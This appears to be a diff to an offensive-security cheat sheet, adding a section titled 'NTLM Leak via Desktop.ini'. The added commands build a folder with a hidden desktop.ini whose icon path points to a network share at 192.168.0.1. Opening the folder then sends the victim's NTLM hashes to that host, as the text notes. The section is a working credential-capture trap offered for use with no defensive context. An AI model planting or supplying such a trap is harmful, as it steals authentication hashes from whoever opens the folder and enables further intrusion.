@@ -255,3 +255,15 @@ $ curl -k -v -I https://bit.ly/3ABvcy5 2>&1 | grep -i "< location" | cut -d " " 
 https://isc.sans.edu/
 ```
 
+## NTLM Leak via Desktop.ini:
+
+The desktop.ini files contain the information of the icons you have applied to the folder. We can abuse this to resolve a network path. Once you open the folder you should get the hashes.
+
+```
+mkdir openMe
+attrib +s openMe
+cd openMe
+echo [.ShellClassInfo] > desktop.ini
+echo IconResource=\\192.168.0.1\aa >> desktop.ini
+attrib +s +h desktop.ini
+```
